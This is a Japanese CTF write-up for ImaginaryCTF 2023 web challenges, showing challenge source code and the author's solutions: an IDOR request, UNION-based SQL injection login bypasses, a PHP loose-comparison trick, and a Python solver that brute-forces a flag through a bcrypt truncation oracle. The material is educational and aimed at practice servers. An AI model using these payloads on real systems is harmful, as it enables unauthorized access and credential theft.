# ImaginaryCTF 2023 Writeup

ImaginaryCTF 2023（<https://ctftime.org/event/2015>）に参加しました。  
土, 22 7月 2023, 04:00 JST — 月, 24 7月 2023, 04:00 JST

チーム0nePaddingで参加しましたが、用事があってちょっとしか参加できなかったです。  
後、簡単な問題しかやってません。

- [web/Idoriot](#idoriot)
- [web/perfect_picture](#perfect_picture)
- [web/blank](#blank)
- [web/idoriot-revenge](#idoriot-revenge)

- 競技後に解いた問題
  - [web/Login](#login)

## Idoriot

ユーザ登録時にidを送っているので、そのidをadminのidに変更するだけ。

```http
POST /register.php HTTP/1.1
Host: idoriot.chal.imaginaryctf.org
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://idoriot.chal.imaginaryctf.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://idoriot.chal.imaginaryctf.org/register.php
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=898fee9264709a2d3903c10d2461d0ef
Connection: close

username=test&password=test&user_id=0
```

- フラグ

```text
ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}
```

## perfect_picture

- 問題ソースコード

```py
from flask import Flask, render_template, request
from PIL import Image
import exiftool
import random
import os

app = Flask(__name__)
app.debug = False

os.system("mkdir /dev/shm/uploads/")
app.config['UPLOAD_FOLDER'] = '/dev/shm/uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'png'}

def check(uploaded_image):
    with open('flag.txt', 'r') as f:
        flag = f.read()
    with Image.open(app.config['UPLOAD_FOLDER'] + uploaded_image) as image:
        w, h = image.size
        if w != 690 or h != 420:
            return 0
        if image.getpixel((412, 309)) != (52, 146, 235, 123):
            return 0
        if image.getpixel((12, 209)) != (42, 16, 125, 231):
            return 0
        if image.getpixel((264, 143)) != (122, 136, 25, 213):
            return 0

    with exiftool.ExifToolHelper() as et:
        metadata = et.get_metadata(app.config['UPLOAD_FOLDER'] + uploaded_image)[0]
        try:
            if metadata["PNG:Description"] != "jctf{not_the_flag}":
                return 0
            if metadata["PNG:Title"] != "kool_pic":
                return 0
            if metadata["PNG:Author"] != "anon":
                return 0
        except:
            return 0
    return flag

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return 'no file selected'

    file = request.files['file']

    if file.filename == '':
        return 'no file selected'

    if file and allowed_file(file.filename):
        filename = file.filename

        img_name = f'{str(random.randint(10000, 99999))}.png'
        file.save(app.config['UPLOAD_FOLDER'] + img_name)
        res = check(img_name)

        if res == 0:
            os.remove(app.config['UPLOAD_FOLDER'] + img_name)
            return("hmmph. that image didn't seem to be good enough.")
        else:
            os.remove(app.config['UPLOAD_FOLDER'] + img_name)
            return("now that's the perfect picture:<br>" + res)

    return 'invalid file'

if __name__ == '__main__':
    app.run()
```

パストラバーサルはできなそう。  
正しい形式の画像をアップロードする方法が正規の方法っぽい。  
以下のようなコードで特定のピクセルの色変更と、exif情報を追加すれば良い。

- solver.py

```py:solver.py
from PIL import Image
import exiftool

OUTPUT_FILE = "text_image.png"

img = Image.new("RGBA", (690, 420), (0, 0, 0, 255))
img.putpixel((412, 309), (52, 146, 235, 123))
img.putpixel((12, 209), (42, 16, 125, 231))
img.putpixel((264, 143), (122, 136, 25, 213))
img.save(OUTPUT_FILE)

with exiftool.ExifToolHelper() as et:
    et.execute("-PNG:Description=jctf{not_the_flag}", OUTPUT_FILE)
    et.execute("-PNG:Title=kool_pic", OUTPUT_FILE)
    et.execute("-PNG:Author=anon", OUTPUT_FILE)
```

`jctf{not_the_flag}`が気になったが、そのまま入れた画像をアップロードしたらフラグがもらえた。

- フラグ

```text
ictf{7ruly_th3_n3x7_p1c4ss0_753433}
```

## blank

- 問題ソースコード（抜粋）

```js
<SNIP>
db.serialize(() => {
  db.run(
    "CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT)"
  );
});
<SNIP>
app.post("/login", (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  console.log(
    'SELECT * FROM users WHERE username = "' +
      username +
      '" and password = "' +
      password +
      '"'
  );

  db.get(
    'SELECT * FROM users WHERE username = "' +
      username +
      '" and password = "' +
      password +
      '"',
    (err, row) => {
      if (err) {
        console.error(err);
        res.status(500).send("Error retrieving user");
      } else {
        console.log(row);
        if (row) {
          req.session.loggedIn = true;
          req.session.username = username;
          res.send("Login successful!");
        } else {
          res.status(401).send("Invalid username or password");
        }
      }
    }
  );
});
<SNIP>
```

SQLインジェクションでadminとしてログインすればよい。  
ただし、adminのデータがデータベースに存在しないため、UNION句を使って空のadminデータをつける必要がある。

```http
POST /login HTTP/1.1
Host: blank.chal.imaginaryctf.org
Content-Length: 65
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://blank.chal.imaginaryctf.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://blank.chal.imaginaryctf.org/login
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: close

username=admin&password=a"union+all+select+null,"admin",null;--+-
```

その後`/flag`にアクセスするとフラグがもらえる。

```text
ictf{sqli_too_powerful_9b36140a}
```

## idoriot-revenge

ログインすると、ソースコードが見れる。

```php
<?php

session_start();

// Check if user is logged in
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

// Check if session is expired
if (time() > $_SESSION['expires']) {
    header("Location: logout.php");
    exit();
}

// Display user ID on landing page
echo "Welcome, User ID: " . urlencode($_SESSION['user_id']);

// Get the user for admin
$db = new PDO('sqlite:memory:');
$admin = $db->query('SELECT * FROM users WHERE username = "admin" LIMIT 1')->fetch();

// Check user_id
if (isset($_GET['user_id'])) {
    $user_id = (int) $_GET['user_id'];
    // Check if the user is admin
    if ($user_id == "php" && preg_match("/".$admin['username']."/", $_SESSION['username'])) {
        // Read the flag from flag.txt
        $flag = file_get_contents('/flag.txt');
        echo "<h1>Flag</h1>";
        echo "<p>$flag</p>";
    }
}

// Display the source code for this file
echo "<h1>Source Code</h1>";
highlight_file(__FILE__);
?>
```

- admin確認部分が突破できれば良い。
  - `if ($user_id == "php" && preg_match("/".$admin['username']."/", $_SESSION['username']))`
  - $user_id == "php"
    - PHPの場合は比較が結構緩いので、`$user_id = 1`で成り立つ。
  - preg_match("/admin/", $_SESSION['username'])
    - usernameにadminが含まれていれば成り立つ。

    ```sh
    $ php -r 'echo preg_match("/admin/","testadmin");'
    1
    ```

### 解法

1. 以下のユーザを登録する。
    - username: saltadmin
    - password: test
2. ログイン後、以下のURLにアクセスする。
    - http://idoriot-revenge.chal.imaginaryctf.org/index.php?user_id=0

- フラグ

```text
ictf{this_ch4lleng3_creator_1s_really_an_idoriot}
```

## Login

以下、競技中は解けなかった問題。  
adminでのログインはできてmagicの値は取得できたが、時間がなくてフラグを取得できなかった。  
問題のソースコードがあるのも気づかなかった。

- 問題ソースコード

/?sourceにアクセスすることで確認できたらしい。  
確かにHTMLソース内にコメントアウトされていた。

```php
<?php

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

$flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';
$magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';
$db = new SQLite3('/db.sqlite3');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$msg = '';

if (isset($_GET[$magic])) {
    $password .= $flag;
}

if ($username && $password) {
    $res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
    if (!$res) {
        $msg = "Invalid username or password";
    } else if (password_verify($password, $res['pwhash'])) {
        $u = htmlentities($res['username']);
        $msg = "Welcome $u! But there is no flag here :P";
        if ($res['username'] === 'admin') {
            $msg .= "<!-- magic: $magic -->";
        }
    } else {
        $msg = "Invalid username or password";
    }
}
?>
<SNIP>
```

usernameでSQLインジェクションができる。  
フラグは、GETパラメータに正しいmagicを付けることで入力したパスワードの後ろに結合された後、password_verify関数に渡されている。

まずはmagicの値を取得する。  
UNION句を使うことで簡単にadminとしてログインはできる。  
パスワードハッシュはphpのpassword_hash関数で生成すれば良さそう。

```sh
$ php -r "echo password_hash('test', PASSWORD_DEFAULT);"
$2y$10$XmEkdpBqwnMU/0jXzLA3q.nX1io/A5Y24G9E9GN1TIAiqOEIjIydu
```

```sh
curl -X POST http://login.chal.imaginaryctf.org/  --data-urlencode $'username=\'union select \'admin\',\'$2y$10$XmEkdpBqwnMU/0jXzLA3q.nX1io/A5Y24G9E9GN1TIAiqOEIjIydu\';-- -' -d "password=test" -s | grep magic
            Welcome admin! But there is no flag here :P<!-- magic: 688a35c685a7a654abc80f8e123ad9f0 -->        </p>
```

- magicの値が`688a35c685a7a654abc80f8e123ad9f0`だということが分かった。

次にパスワードの後ろにフラグが結合されるため、password_verify関数で判別する必要がある。  
また、`username=admin&password[]=test`等でSQLエラーを発生すると、レスポンスに`$2y$10$Is00vB1h...`が出力されることから、パスワードにはBcryptが使われていると推測できる。  
Bcryptの場合は、password_verify時にパスワードが73文字以降は切り捨てられるため、差分で確認が可能。

- <https://www.php.net/manual/ja/function.password-hash.php#refsect1-function.password-hash-parameters>

例えば、passwordにAを71文字入力すると、フラグが後ろに付与されるため、`AAA...AAAictf{...`のような文字列になるが、password_verifyで確認されるパスワードは`AAA..AAAi`が確認される。  
ここまで分かれば、後はその値のハッシュが正しくなるまで一文字ずつ総当たりすれば良い。

- solver.py

```py:solver.py
#!/usr/local/bin/python
import requests
import bcrypt

TARGET = "http://login.chal.imaginaryctf.org/"
KEYS = list("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWZ .:,~^)(=-_&@#!\"$%?}{")
SALT = bcrypt.gensalt(rounds=10, prefix=b'2b')

def search(flag: str = ""):
  print(flag)
  for key in KEYS:
    offset = "A" * (71 - len(flag))
    hash = bcrypt.hashpw((offset + flag + key).encode(), SALT).decode()
    payload = {
      "username": f"'union select 'admin','{hash}';-- -", 
      "password": offset
    }
    result = requests.post(f'{TARGET}?688a35c685a7a654abc80f8e123ad9f0', data=payload)
    # print(result.request.body)
    if "Welcome admin!" in result.text:
      return search(flag + key)
  return flag

print(f"flag={search()}")
```

```sh
$ python solver.py 

i
ic
ict
ictf
ictf{
ictf{w
ictf{wh
ictf{why
ictf{why_
<SNIP>
ictf{why_are_bcrypt_truncating_my_passwor
ictf{why_are_bcrypt_truncating_my_password
ictf{why_are_bcrypt_truncating_my_passwords
ictf{why_are_bcrypt_truncating_my_passwords?
ictf{why_are_bcrypt_truncating_my_passwords?!
ictf{why_are_bcrypt_truncating_my_passwords?!}
flag=ictf{why_are_bcrypt_truncating_my_passwords?!}
```

- フラグ

```text
ictf{why_are_bcrypt_truncating_my_passwords?!}
```
